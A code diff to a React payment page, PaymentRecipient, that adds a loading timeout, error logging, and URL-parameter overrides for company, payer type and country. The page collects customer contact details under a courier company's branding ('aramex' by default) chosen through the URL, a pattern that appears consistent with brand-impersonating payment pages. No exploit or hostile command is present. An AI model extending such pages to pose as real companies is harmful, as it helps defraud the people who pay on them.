@@ -21,21 +21,37 @@ import PageLoader from "@/components/PageLoader";
 const PaymentRecipient = () => {
   const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading } = useLink(id);
+  const { data: linkData, isLoading, isError, error } = useLink(id);
   const updateLink = useUpdateLink();
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showPage, setShowPage] = useState(false);
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setShowPage(true);
+    }, 3000);
+    return () => clearTimeout(timer);
+  }, []);
+
+  useEffect(() => {
+    if (linkData || isError) {
+      setShowPage(true);
+    }
+  }, [linkData, isError]);
 
   const urlParams = new URLSearchParams(window.location.search);
-  // دعم Path Parameters + Query Parameters (backward compatible)
-  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  // دعم Path Parameters + Query Parameters (backward compatible) - أولوية لـ URL parameters
+  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
   const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
   const titleParam = urlParams.get('title');
   const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
   const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
+  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
+  const countryParam = urlParams.get('country') || urlParams.get('c');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -46,9 +62,10 @@ const PaymentRecipient = () => {
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
   const dynamicImage = companyMeta.image;
 
+  // أولوية للـ query parameters، ثم linkData، ثم defaults
   const shippingInfo = linkData?.payload as Record<string, unknown>;
-  const payerType = shippingInfo?.payer_type || "recipient";
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
+  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
   const currencyCode = currencyParam || countryData?.currency || "SAR";
@@ -66,8 +83,12 @@ const PaymentRecipient = () => {
     }
   }
 
-  if (isLoading) {
+  if (isLoading && !showPage) {
     return <PageLoader message="جاري تحميل بيانات الدفع..." />;
+  }
+
+  if (isError) {
+    console.error('Error loading link:', error);
   }
 
   const formattedAmount = formatCurrency(amount, currencyCode);
